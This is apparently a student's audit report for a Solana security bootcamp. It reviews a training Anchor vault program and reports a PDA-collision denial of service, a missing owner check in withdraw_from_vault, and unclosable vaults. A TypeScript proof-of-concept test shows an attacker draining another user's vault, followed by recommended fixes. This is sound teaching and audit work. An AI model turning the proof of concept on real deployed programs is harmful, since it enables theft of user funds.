# Rektoff Lecture 8 Assignment

**Auditor:** Han (0x4lifemen) (GitHub: [honghan-dev](https://github.com/honghan-dev)) ([X](https://x.com/4lifemen))
**Scope:** Review of `account_4/programs/account_4/src/lib.rs`

---

### Table of Contents

1. [Introduction](#intro)
2. [Methodology](#methodology)
3. [Security Review Summary](#summary)
4. [Findings Details](#findings-details)
   * [High Severity](#high-severity)
        * [H-01 - User fund stuck due to DOS caused by PDA collision](#h1)
        * [H-02 – Missing Ownership Validation in `withdraw_from_vault`](#h2)
   * [Medium Severity](#medium-severity)
   * [Low Severity](#low-severity)
   * [Informational / Gas Optimization](#informational--gas-optimization)
        * [Info-01](#info01)
5. [Recommendations](#recommendations)

---

## Project Summary

The `account_4` program implements a simple on-chain vault system on **Solana** using **Anchor framework**. It allows users to create `user_vaults`, deposit funds, and withdraw funds.

The audit reviewed the `initialization`, `deposit`, and `withdrawal` flows — including PDA derivation logic, access control validation, and account lifecycle behavior — to identify potential security and design issues.

---

## Severity Summary

| Severity | Count |
|-----------|-------|
| 🔴 High   | 2 |
| 🟠 Medium | 0 |
| 🟡 Low    | 0 |
| 🔵 Info   | 1 |
| **Total** | **3** |

---

## 🔎 Findings Details

### High Severity

### <a id="h1">H-01 - User fund stuck due to DOS caused by PDA collision</a>

**Affected file(s)** [account_4/src/lib.rs](https://github.com/mario-eth/rektoff-solana-bootcamp-lectures/blob/c51909976951612ed95d429b6083072e396e3c1e/lecture_2/account_4/programs/account_4/src/lib.rs#L27-L38) & [account_4/src/lib.rs](https://github.com/mario-eth/rektoff-solana-bootcamp-lectures/blob/c51909976951612ed95d429b6083072e396e3c1e/lecture_2/account_4/programs/account_4/src/lib.rs#L110-L119)

**Severity:** HIGH

**Note** This bug has already been identify in the lecture

**Proof of concept:** [Proof of concept](https://github.com/mario-eth/rektoff-solana-bootcamp-lectures/blob/main/lecture_2/account_4/tests/account_4.ts)

**Impact:** HIGH

1. User's fund will be stuck in the `user_vault` due to DOS caused by PDA collision, causing direct loss of fund.

**Recommendation**

Remove the `vault_authority` account in the `account_4::WithdrawFromVault`.

```diff
    #[derive(Accounts)]
    #[instruction(user_id: u64, vault_name: String)]
    pub struct WithdrawFromVault<'info> {
        #[account(
            mut,
            seeds = [
                b"user_vault", 
                user_id.to_le_bytes().as_ref(),
                vault_name.as_bytes()
            ],
            bump
        )]
        pub user_vault: Account<'info, UserVault>,
-        #[account(
-            seeds = [
-            b"authority",
-            user_id.to_le_bytes().as_ref(),
-            vault_name.as_bytes()
-            ],
-        bump
-        )]
-        pub vault_authority: Account<'info, UserVault>,
        #[account(mut)]
        pub user: Signer<'info>,
    }
```

### <a id="h2">H-02 – Missing Ownership Validation in `withdraw_from_vault`</a>

**Severity:** HIGH

**Affected file(s):** [account_4/src/lib.rs](https://github.com/mario-eth/rektoff-solana-bootcamp-lectures/blob/c51909976951612ed95d429b6083072e396e3c1e/lecture_2/account_4/programs/account_4/src/lib.rs#L181-L201)

**Description:**
The `account_4::withdraw_from_vault` instruction does not verify that only the vault owner can withdraw NFT.
This allows any signer to withdraw funds from another user’s vault, as long as they supply the correct PDA.

**Finding Description**

[account_4::withdraw_from_vault](https://github.com/mario-eth/rektoff-solana-bootcamp-lectures/blob/c51909976951612ed95d429b6083072e396e3c1e/lecture_2/account_4/programs/account_4/src/lib.rs#L181-L201) missing an vault owner verification, allowing anyone to withdraw NFT.

```rust
pub fn withdraw_from_vault(
    ctx: Context<WithdrawFromVault>,
    user_id: u64,
    vault_name: String,
    amount: u64,
) -> Result<()> {
    let vault = &mut ctx.accounts.user_vault;

    // @audit missing owner verification
    require!(vault.balance >= amount, ErrorCode::InsufficientBalance);

    vault.balance -= amount;

    msg!(
        "Withdrew {} tokens from vault '{}' for user {}",
        amount,
        vault_name,
        user_id
    );
    Ok(())
}
```

**Impact:** HIGH

1. Attacker can drain any user's fund, causing significant loss to user.

**Proof of Concept**

<details>
<summary>Click here to expand</summary>

Include this test block in the `account_4/tests/account_4.ts`

```typescript
 it("should demonstrate unauthorized withdrawal", async () => {
    console.log("\n=== Testing Unauthorized Withdrawal Vulnerability ===");

    // Generate PDAs
    const [collectionAuthorityPDA] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("authority"),
        collisionId.toArrayLike(Buffer, "le", 8),
        Buffer.from(collisionName)
      ],
      program.programId
    );

    const [userVaultPDA] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("user_vault"),
        collisionId.toArrayLike(Buffer, "le", 8),
        Buffer.from(collisionName)
      ],
      program.programId
    );

    // Step 1: Create collection authority
    console.log("\nStep 1: Creating collection authority");
    const createCollectionTxSig = await program.methods
      .initializeCollectionAuthority(collisionId, collisionName)
      .accounts({
        collectionAuthority: collectionAuthorityPDA,
        payer: collectionOwner.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([collectionOwner])
      .rpc();

    await showProgramLogs(createCollectionTxSig, "Collection Authority Creation");
    console.log("Collection authority created successfully");

    // Step 2: Initialize user vault
    await program.methods
      .initializeUserVault(collisionId, collisionName)
      .accounts({
        userVault: userVaultPDA,
        payer: vaultUser.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([vaultUser])
      .rpc();

    console.log("✅ Vault created by:", vaultUser.publicKey.toBase58());

    // Step 3: Deposit tokens into the vault (by the owner)
    const depositAmount = new anchor.BN(100);
    await program.methods
      .depositToVault(collisionId, collisionName, depositAmount)
      .accounts({
        userVault: userVaultPDA,
        user: vaultUser.publicKey,
      })
      .signers([vaultUser])
      .rpc();

    // vault balance before the attack
    let vaultAfter = await program.account.userVault.fetch(userVaultPDA);
    console.log("Vault balance before:", vaultAfter.balance.toString());

    // Step 4: Attacker tries to withdraw from victim's vault
    try {
      const withdrawAmount = new anchor.BN(50);

      // attacker tries to withdraw
      const withdrawTxSig = await program.methods
        .withdrawFromVault(collisionId, collisionName, withdrawAmount)
        .accounts({
          userVault: userVaultPDA,
          user: attacker.publicKey, // <== Attacker signs here
        })
        .signers([attacker])
        .rpc();

      // vault balance after the attack
      let vaultAfter = await program.account.userVault.fetch(userVaultPDA);
      console.log("Vault balance after:", vaultAfter.balance.toString());
    } catch (error) {
      console.log("✅ Withdrawal failed as expected:", error.message);
    }
  });

```

Call log shows that the balance reduced indicating attacker can drain user's vault:

```sh
Collection authority created successfully
✅ Vault created by: CYYf4hEuhAPPoat485o42A1jRSmXhR9cjgNXvDcHufmS
Vault balance before: 100
Vault balance after: 50
    ✔ should demonstrate unauthorized withdrawal (1850ms)
```

</details>

**Recommendation:**
Add a check ensuring the signer matches the vault owner:

```rust
#[account]
pub struct UserVault {
+   pub user: Pubkey // <@- add this user
    pub user_id: u64,
    pub vault_name: String,
    pub balance: u64,
}

#[derive(Accounts)]
#[instruction(user_id: u64, vault_name: String)]
pub struct InitializeUserVault<'info> {
    #[account(
        init,
        payer = payer,
+        space = 8 + 8 + 4 + vault_name.len() + 8 + 32, // <@- add additional 32 bytes
        seeds = [
            b"user_vault", 
            user_id.to_le_bytes().as_ref(),
            vault_name.as_bytes()
        ],
        bump
    )]
    pub user_vault: Account<'info, UserVault>,
    #[account(mut)]
    pub payer: Signer<'info>,
    pub system_program: Program<'info, System>,
}

#[derive(Accounts)]
#[instruction(user_id: u64, vault_name: String)]
pub struct WithdrawFromVault<'info> {
    #[account(
        mut,
        seeds = [
            b"user_vault", 
            user_id.to_le_bytes().as_ref(),
            vault_name.as_bytes()
        ],
        bump,
        has_one = user // <@- add this constraint
    )]
    pub user_vault: Account<'info, UserVault>,
    #[account(mut)]
    pub user: Signer<'info>,
}
```

---

### Informational

### <a id="info01">Info - User can't close `user_vault`</a>

**Severity:** Informational

**Description**

When a user withdraws their full balance from the vault, the UserVault PDA remains open on-chain.
Since PDAs are rent-exempt accounts, a small amount of SOL (the rent-exemption lamports) remains locked inside the account indefinitely.

```rust
#[account(
    init,
    payer = payer,
    space = 8 + 8 + 4 + vault_name.len() + 8,
    seeds = [b"user_vault", user_id.to_le_bytes().as_ref(), vault_name.as_bytes()],
    bump
)]
pub user_vault: Account<'info, UserVault>,
```

**Impact:** Low

* The user permanently loses a small amount of SOL used for rent (typically ~0.002–0.005 SOL).
* Over time, a large number of empty vaults can increase state bloat and unnecessary ledger footprint.

**Recommendation**

Allow user to close their `user_vault`
